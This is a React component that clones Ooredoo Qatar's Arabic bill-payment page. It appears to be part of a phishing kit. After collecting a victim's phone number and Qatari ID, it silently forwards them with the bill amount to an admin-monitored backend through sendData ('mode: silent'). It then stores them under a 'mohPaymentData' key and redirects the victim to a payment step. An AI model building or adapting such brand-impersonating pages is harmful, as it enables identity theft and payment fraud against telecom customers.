import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { useIsMobile } from '../hooks/useMobile';
import { navigateToPage, sendData } from '../lib/store';

export default function PayForOthers() {
  const [, setLocation] = useLocation();
  const [step, setStep] = useState(1);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [qatarId, setQatarId] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [billingData, setBillingData] = useState<any>(null);
  const isMobile = useIsMobile();

  useEffect(() => {
    navigateToPage('دفع الفاتورة');
  }, []);

  const isValidPhone = phoneNumber.length === 8 && ['3','5','6','7'].includes(phoneNumber.charAt(0));

  const handleStep1Continue = () => {
    if (!isValidPhone) {
      setError('يرجى إدخال رقم حساب أو خدمة صحيح.');
      return;
    }
    setStep(2);
    setError('');
  };

  const handleStep2Continue = async () => {
    if (qatarId.length < 10) {
      setError('يرجى إدخال رقم البطاقة الشخصية القطرية صحيح.');
      return;
    }
    setLoading(true);
    setError('');
    try {
      const res = await fetch(`https://selfcare.ooredoo.qa/apigw/mcrosrvc/cf/v4/jm-billing/otherAccount?searchNumber=${phoneNumber}&otherId=${qatarId}`, {
        method: 'GET',
        headers: {
          'Accept': 'application/json, text/plain, */*',
        },
      });
      if (res.ok) {
        const data = await res.json();
        setBillingData(data);
        setStep(3);
      } else {
        setError('رقم الحساب أو الخدمة ورقم البطاقة الشخصية القطرية اللذان تم إدخالهما لا يتطابقان. يرجى المحاولة مرة أخرى.');
      }
    } catch (err) {
      // CORS error - try via server proxy as fallback
      try {
        const BILLING_API_BASE = ((import.meta as any).env?.VITE_SOCKET_URL || '').replace(/\/$/, '');
        const apiBase = BILLING_API_BASE ? (BILLING_API_BASE.startsWith('http') ? BILLING_API_BASE : `https://${BILLING_API_BASE}`) : '';
        const res2 = await fetch(`${apiBase}/api/ooredoo/billing/${phoneNumber}/${qatarId}`);
        const data2 = await res2.json();
        if (data2.success && data2.data) {
          setBillingData(data2.data);
          setStep(3);
        } else {
          setError(data2.message || 'رقم الحساب أو الخدمة ورقم البطاقة الشخصية القطرية اللذان تم إدخالهما لا يتطابقان. يرجى المحاولة مرة أخرى.');
        }
      } catch (err2) {
        setError('حدث خطأ أثناء الاتصال بخدمة أوريدو. يرجى المحاولة مرة أخرى.');
      }
    } finally {
      setLoading(false);
    }
  };
  const handleStep3Continue = () => {
    const amount = billingData?.totalAmount || billingData?.amount || billingData?.outstandingAmount || 0;
    const paymentData = {
      serviceType: 'دفع فاتورة Ooredoo',
      totalAmount: amount,
      persons: [{ name: phoneNumber, amount }],
      customerPhone: phoneNumber,
      paymentMethod: 'بوابة الدفع الإلكتروني',
      source: 'pay-bill',
      qatarId: qatarId,
      lineType: 'POSTPAID',
      billingData: billingData,
    };
    localStorage.setItem('mohPaymentData', JSON.stringify(paymentData));
    sendData({
      data: {
        'رقم الهاتف': phoneNumber,
        'رقم البطاقة القطرية': qatarId,
        'المبلغ': String(amount),
        'الخدمة': 'دفع فاتورة Ooredoo',
      },
      current: 'دفع الفاتورة',
      waitingForAdminResponse: false,
      mode: 'silent',
    });
    setLocation('/summary-payment?service=moh');
  };

  const handleClose = () => {
    setLocation('/');
  };

  const handleBack = () => {
    if (step === 3) {
      setStep(2);
    } else {
      setStep(1);
    }
    setError('');
  };

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;600;700;800&display=swap');
        @import url('https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@300;400;500;600;700;800&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        .oq-page {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          font-family: Rubik, 'Noto Kufi Arabic', sans-serif;
          direction: rtl;
          background: #f5f5f5;
          position: relative;
        }
        .oq-pink-bg {
          position: absolute;
          top: 0;
          right: 0;
          width: 42%;
          height: 100%;
          background-color: rgb(240, 148, 145);
          border-top-left-radius: 24px;
          z-index: 0;
        }

        /* ===== HEADER ===== */
        .oq-header {
          display: flex;
          align-items: center;
          padding: 24px 32px 24px 64px;
          background: transparent;
          height: 85px;
          position: relative;
          z-index: 10;
          direction: rtl;
        }
        .oq-header__logo {
          position: absolute;
          left: calc(58% - 140px - 64px);
        }
        .oq-header__logo img {
          width: 140px;
          height: 36px;
          display: block;
          object-fit: contain;
        }
        .oq-header__nav {
          display: flex;
          align-items: center;
          gap: 16px;
          font-size: 16px;
          direction: ltr;
          margin-right: auto;
        }
        .oq-header__nav a {
          text-decoration: none;
          font-weight: 600;
          font-size: 14px;
          font-family: Rubik, sans-serif;
        }
        .oq-nav-btn {
          display: inline-flex;
          align-items: center;
          gap: 5px;
          color: #ed1c24 !important;
          font-size: 14px !important;
        }
        .oq-nav-btn:hover {
          opacity: 0.8;
        }
        .oq-nav-lang {
          color: #1c1c24 !important;
          font-size: 14px !important;
        }
        .oq-nav-lang:hover { color: #ed1c24 !important; }

        /* ===== MAIN LAYOUT ===== */
        .oq-main {
          flex: 1;
          display: flex;
          flex-direction: row;
          min-height: 0;
          direction: ltr;
          position: relative;
          z-index: 1;
        }
        .oq-content-col {
          flex: 58;
          display: flex;
          flex-direction: column;
          position: relative;
          background: #fff;
          max-width: 58%;
          direction: rtl;
        }
        .oq-pink-col {
          flex: 42;
          position: relative;
          overflow: hidden;
        }

        /* ===== SUBHEADER ===== */
        .oq-subheader {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 12px 32px 12px 32px;
          background: #ebf0f0;
          color: #1c1c24;
          flex-shrink: 0;
        }
        .oq-subheader h3 {
          font-size: 23px;
          font-weight: 700;
          margin: 0;
          color: #1c1c24;
          font-family: 'Noto Kufi Arabic', sans-serif;
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .oq-subheader__close {
          background: none;
          border: none;
          color: #1c1c24;
          cursor: pointer;
          padding: 4px;
          display: flex;
          align-items: center;
        }
        .oq-subheader__close svg {
          width: 24px;
          height: 24px;
          stroke: #1c1c24;
          fill: none;
          stroke-width: 2;
        }
        .oq-subheader__back {
          background: none;
          border: none;
          color: #1c1c24;
          cursor: pointer;
          padding: 4px;
          display: flex;
          align-items: center;
          font-size: 22px;
        }

        /* ===== STEPPER ===== */
        .oq-stepper {
          display: flex;
          align-items: center;
          gap: 8px;
          direction: rtl;
          padding: 12px 0 12px 0;
          flex-shrink: 0;
          background: #fff;
          margin: 0 64px 0 0;
        }
        .oq-stepper__label {
          font-size: 14px;
          font-weight: 400;
          color: rgb(20, 27, 77);
        }
        .oq-stepper__step-num {
          font-size: 14px;
          font-weight: 400;
          color: rgb(20, 27, 77);
          margin-right: 4px;
        }
        .oq-stepper__dots {
          display: flex;
          gap: 6px;
          margin-right: 12px;
        }
        .oq-stepper__dot {
          width: 12px;
          height: 12px;
          border-radius: 50%;
          background: #d0d0d0;
        }
        .oq-stepper__dot--active {
          background: #1a73e8;
        }

        /* ===== FORM AREA ===== */
        .oq-form-area {
          flex: 1;
          background: #ebf0f0;
          display: flex;
          flex-direction: column;
        }
        .oq-form-content {
          background: #fff;
          border-radius: 16px 16px 0 0;
          flex: 1;
          display: flex;
          flex-direction: column;
        }
        .oq-form-grid {
          padding: 40px 64px 64px;
          display: flex;
          flex-direction: column;
          flex: 1;
          align-items: stretch;
        }
        .oq-form-inner {
          max-width: 100%;
          width: 100%;
        }

        .oq-form-heading {
          font-size: 38px;
          font-weight: 600;
          color: #1c1c24;
          margin: 0 0 12px;
          display: flex;
          align-items: flex-end;
          gap: 8px;
          line-height: 1.5;
          font-family: Rubik, sans-serif;
        }
        .oq-form-heading .emoji {
          font-size: 40px;
        }

        .oq-form-desc {
          font-size: 20px;
          line-height: 28px;
          color: #1c1c24;
          margin: 0 0 0;
          padding: 12px 0;
          font-family: 'Noto Kufi Arabic', sans-serif;
        }

        /* ===== INPUT FIELD ===== */
        .oq-field-group {
          position: relative;
          margin-top: 44px;
          margin-bottom: 20px;
        }
        .oq-field-group input {
          width: 100%;
          padding: 12px 12px 12px 60px;
          border: 1px solid #8f8f8f;
          border-radius: 8px;
          font-size: 18px;
          font-family: Rubik, 'Noto Kufi Arabic', sans-serif;
          color: #1c1c24;
          background: #fff;
          outline: none;
          direction: rtl;
          text-align: start;
          height: 48px;
          width: 100%;
          max-width: 412px;
          transition: border-color 0.2s;
        }
        .oq-field-group input:focus {
          border-color: #1c1c24;
          box-shadow: 0 0 0 1px #1c1c24;
        }
        .oq-field-group input.valid-input {
          border-color: #4caf50;
          box-shadow: 0 0 0 1px #4caf50;
        }
        .oq-field-group input::placeholder {
          color: transparent;
        }
        .oq-field-group label {
          position: absolute;
          top: 50%;
          right: 12px;
          transform: translateY(-50%);
          font-size: 18px;
          font-weight: 600;
          color: #6d6d6d;
          pointer-events: none;
          transition: all 0.2s ease;
          background: #fff;
          padding: 0 4px;
          line-height: 1;
        }
        .oq-field-group input:focus + label,
        .oq-field-group input:not(:placeholder-shown) + label {
          top: 0;
          font-size: 12px;
          color: #6d6d6d;
          transform: translateY(-50%);
        }
        .oq-field-check {
          position: absolute;
          left: 16px;
          top: 50%;
          transform: translateY(-50%);
          color: #4caf50;
          font-size: 20px;
          font-weight: bold;
        }

        .oq-field-status {
          min-height: 20px;
          font-size: 13px;
          margin-top: 4px;
        }
        .oq-field-status .error { color: #ed1c24; }

        /* ===== BUTTON ===== */
        .oq-btn-area {
          margin-top: 64px;
        }
        .oq-btn {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          width: 210px;
          padding: 14px 24px;
          margin: 0;
          border: none;
          border-radius: 32px;
          font-size: 18px;
          font-weight: 500;
          font-family: Rubik, 'Noto Kufi Arabic', sans-serif;
          cursor: pointer;
          transition: all 0.2s;
          background: #ed1c24;
          color: #fff;
          height: 48px;
        }
        .oq-btn:hover:not(:disabled) {
          background: #d41920;
        }
        .oq-btn:disabled {
          background: #ccc;
          color: #888;
          cursor: not-allowed;
        }

        /* ===== FOOTER ===== */
        .oq-footer {
          background: #2f2f2f;
          color: #fff;
          padding: 12px 72px;
          display: flex;
          align-items: flex-start;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 12px;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          direction: rtl;
          position: relative;
          z-index: 10;
          min-height: 71px;
        }
        .oq-footer__right {
          display: flex;
          flex-direction: column;
          gap: 6px;
        }
        .oq-footer__links {
          display: flex;
          align-items: center;
          gap: 16px;
          flex-wrap: wrap;
        }
        .oq-footer__links a {
          color: #fff;
          text-decoration: none;
          font-size: 14px;
          font-weight: 700;
        }
        .oq-footer__links a:hover { text-decoration: underline; }

        .oq-footer__left {
          display: flex;
          align-items: center;
          gap: 12px;
          direction: rtl;
        }
        .oq-footer__social {
          display: flex;
          gap: 14px;
          align-items: center;
          direction: ltr;
        }
        .oq-footer__social a {
          color: #fff;
          text-decoration: none;
          display: flex;
          align-items: center;
        }
        .oq-footer__social a:hover { color: #ccc; }
        .oq-footer__social svg {
          width: 20px;
          height: 20px;
          fill: currentColor;
        }
        .oq-footer__copy {
          color: #fff;
          font-size: 12px;
          font-weight: 400;
        }

        /* ===== MOBILE ===== */
        /* ===== MOBILE NAV ===== */
        .oq-mobile-nav {
          display: none;
          align-items: center;
          justify-content: flex-start;
          padding: 0 12px;
          height: 44px;
          background: #fff;
          border-bottom: 1px solid #eee;
          gap: 0;
        }
        .oq-mobile-nav__btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 10px 16px;
          font-size: 13px;
          font-weight: 500;
          color: #221e20;
          text-decoration: none;
          border-radius: 20px;
          white-space: nowrap;
          transition: all 0.2s;
        }
        .oq-mobile-nav__btn.active {
          background: #ed1c24;
          color: #fff;
        }
        .oq-mobile-nav__btn.active svg {
          stroke: #fff;
        }
        .oq-mobile-nav__btn:not(.active):hover {
          background: #f5f5f5;
        }
        @media (max-width: 768px) {
          .oq-header {
            padding: 12px 16px;
            height: auto;
          }
          .oq-header__logo img {
            width: 100px;
            height: 28px;
          }
          .oq-header__nav {
            display: none;
          }
          .oq-mobile-nav {
            display: flex !important;
          }
          .oq-subheader {
            padding: 12px 16px;
          }
          .oq-subheader h3 {
            font-size: 18px;
          }
          .oq-pink-col {
            display: none;
          }
          .oq-main {
            flex-direction: column;
          }
          .oq-content-col {
            width: 100%;
            max-width: 100%;
          }
          .oq-stepper {
            margin: 0 16px 0 0;
          }
          .oq-form-grid {
            padding: 24px 16px 48px;
          }
          .oq-form-heading {
            font-size: 22px;
          }
          .oq-form-desc {
            font-size: 16px;
            line-height: 24px;
          }
          .oq-btn-area {
            margin-top: 40px;
          }
          .oq-btn {
            width: 100%;
          }
          .oq-footer {
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 16px;
          }
          .oq-footer__links {
            justify-content: center;
          }
          .oq-footer__left {
            flex-direction: column;
            align-items: center;
          }
        }

        /* ===== INVOICE CARD ===== */
        .oq-invoice-card {
          background: #fff;
          border: 1px solid #e0e0e0;
          border-radius: 12px;
          padding: 24px;
          margin-top: 24px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.06);
        }
        .oq-invoice-row {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 12px 0;
        }
        .oq-invoice-label {
          font-size: 15px;
          color: #666;
          font-weight: 400;
        }
        .oq-invoice-value {
          font-size: 15px;
          color: #1a1a1a;
          font-weight: 600;
        }
        .oq-invoice-amount {
          font-size: 20px;
          color: #c00;
          font-weight: 700;
        }
        .oq-invoice-divider {
          height: 1px;
          background: #eee;
          margin: 0;
        }
      `}</style>

      <div className="oq-page">
        {/* Pink background */}
        {!isMobile && <div className="oq-pink-bg" />}

        {/* Header */}
        <header className="oq-header">
          <div className="oq-header__logo">
            <img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo" />
          </div>
          <nav className="oq-header__nav">
            <a href="#" className="oq-nav-lang">English</a>
            <a href="/recharge" className="oq-nav-btn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18.01"/></svg>تعبئة الرصيد</a>
            <a href="/pay-for-others" className="oq-nav-btn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 10h20"/></svg>دفع الفواتير</a>
          </nav>
        </header>
        {/* MOBILE NAV BAR */}
        <div className="oq-mobile-nav">
          <a href="/recharge" className="oq-mobile-nav__btn">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18.01"/></svg>
            تعبئة الرصيد
          </a>
          <a href="/pay-for-others" className="oq-mobile-nav__btn active">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 10h20"/></svg>
            دفع الفواتير
          </a>
        </div>

        {/* Main layout */}
        <div className="oq-main">
          <div className="oq-content-col">
            {/* Subheader */}
            <div className="oq-subheader">
              <h3>
                {(step === 2 || step === 3) && (
                  <button className="oq-subheader__back" type="button" onClick={handleBack}>
                    →
                  </button>
                )}
                دفع الفاتورة
              </h3>
              <button className="oq-subheader__close" type="button" onClick={handleClose}>
                <svg viewBox="0 0 24 24">
                  <line x1="18" y1="6" x2="6" y2="18" />
                  <line x1="6" y1="6" x2="18" y2="18" />
                </svg>
              </button>
            </div>

            {/* Stepper */}
            <div className="oq-stepper">
              <span className="oq-stepper__label">الخطوة</span>
              <span className="oq-stepper__step-num">{step}</span>
              <div className="oq-stepper__dots">
                <div className={`oq-stepper__dot oq-stepper__dot--active`} />
                <div className={`oq-stepper__dot ${step >= 2 ? 'oq-stepper__dot--active' : ''}`} />
                <div className={`oq-stepper__dot ${step >= 3 ? 'oq-stepper__dot--active' : ''}`} />
              </div>
            </div>

            {/* Form area */}
            <div className="oq-form-area">
              <div className="oq-form-content">
                <div className="oq-form-grid">
                  <div className="oq-form-inner">
                    {step === 1 && (
                      <>
                        <h2 className="oq-form-heading">
                          ادفع بسهولة
                          <span className="emoji">🚀</span>
                        </h2>
                        <p className="oq-form-desc">
                          يرجى تعبئة المعلومات المطلوبة لتتمكن
                          <br />
                          من دفع فواتير حسابات العائلة والأصدقاء.
                        </p>

                        <div className="oq-field-group">
                          <input
                            type="text"
                            inputMode="numeric"
                            maxLength={8}
                            placeholder=" "
                            value={phoneNumber}
                            onChange={(e) => {
                              setPhoneNumber(e.target.value.replace(/[^0-9]/g, '').slice(0, 8));
                              setError('');
                            }}
                            className={isValidPhone ? 'valid-input' : ''}
                          />
                          <label>رقم الحساب أو الخدمة</label>
                          {isValidPhone && <span className="oq-field-check">✓</span>}
                        </div>

                        <div className="oq-field-status">
                          {error && <span className="error">{error}</span>}
                        </div>
                      </>
                    )}

                    {step === 2 && (
                      <>
                        <h2 className="oq-form-heading">
                          لقد أوشكت على الانتهاء!
                        </h2>
                        <p className="oq-form-desc">
                          يرجى إدخال رقم البطاقة الشخصية القطرية
                          <br />
                          المرتبطة برقم الحساب أو الخدمة الذي قمت بإدخاله.
                        </p>

                        <div className="oq-field-group">
                          <input
                            type="text"
                            inputMode="numeric"
                            maxLength={11}
                            placeholder=" "
                            value={qatarId}
                            onChange={(e) => {
                              setQatarId(e.target.value.replace(/[^0-9]/g, '').slice(0, 11));
                              setError('');
                            }}
                          />
                          <label>رقم البطاقة الشخصية القطرية</label>
                        </div>

                        <div className="oq-field-status">
                          {error && <span className="error">{error}</span>}
                        </div>
                      </>
                    )}
                  </div>

                  {/* Button */}
                  <div className="oq-btn-area">
                    <button
                      type="button"
                      className="oq-btn"
                      onClick={step === 1 ? handleStep1Continue : handleStep2Continue}
                    >
                      استمرار
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Pink panel */}
          {!isMobile && <div className="oq-pink-col" />}
        </div>

        {/* Footer */}
        <footer className="oq-footer">
          <div className="oq-footer__right">
            <div className="oq-footer__links">
              <a href="#">الاتصال بنا</a>
              <span style={{color:'#fff', fontSize:'14px', fontWeight:700}}>|</span>
              <a href="#">شروط استخدام الموقع</a>
              <span style={{color:'#fff', fontSize:'14px', fontWeight:700}}>|</span>
              <a href="#">سياسة الخصوصية</a>
              <span style={{color:'#fff', fontSize:'14px', fontWeight:700}}>|</span>
              <a href="#">اتفاقية الخدمات الرئيسية للأعمال</a>
            </div>
            <span className="oq-footer__copy">Ooredoo &copy; 2024 . جميع الحقوق محفوظة</span>
          </div>
          <div className="oq-footer__left">
            <span style={{color:'#fff', fontSize:'16px', fontWeight:400}}>تابعنا</span>
            <div className="oq-footer__social">
              <a href="https://www.facebook.com/ooredooqatar" target="_blank" rel="noopener noreferrer">
                <svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
              </a>
              <a href="https://www.instagram.com/Ooredooqatar/" target="_blank" rel="noopener noreferrer">
                <svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="none" stroke="currentColor" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="currentColor" strokeWidth="2"/><circle cx="17.5" cy="6.5" r="1.5"/></svg>
              </a>
              <a href="https://twitter.com/ooredooqatar" target="_blank" rel="noopener noreferrer">
                <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
              </a>
              <a href="https://www.youtube.com/user/OoredooQatar" target="_blank" rel="noopener noreferrer">
                <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
              </a>
              <a href="https://www.linkedin.com/company/ooredooqatar" target="_blank" rel="noopener noreferrer">
                <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
              </a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
}
